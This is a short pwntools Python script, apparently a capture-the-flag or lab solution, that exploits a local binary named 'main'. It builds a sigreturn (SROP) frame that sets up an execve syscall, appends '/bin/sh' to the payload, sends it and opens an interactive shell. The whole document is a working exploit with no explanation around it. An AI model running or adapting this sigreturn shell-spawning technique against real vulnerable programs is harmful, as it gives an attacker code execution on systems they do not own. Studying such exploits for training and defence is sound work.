#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./main')
elf = ELF('./main')

#gdb.attach(p)

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = elf.symbols['buf'] + 0x100
frame.rsi = 0
frame.rdx = 0
frame.rip = elf.symbols['syscall']

payload = str(frame).ljust(0x100, 'A') + '/bin/sh\x00'
p.send(payload)

p.interactive()

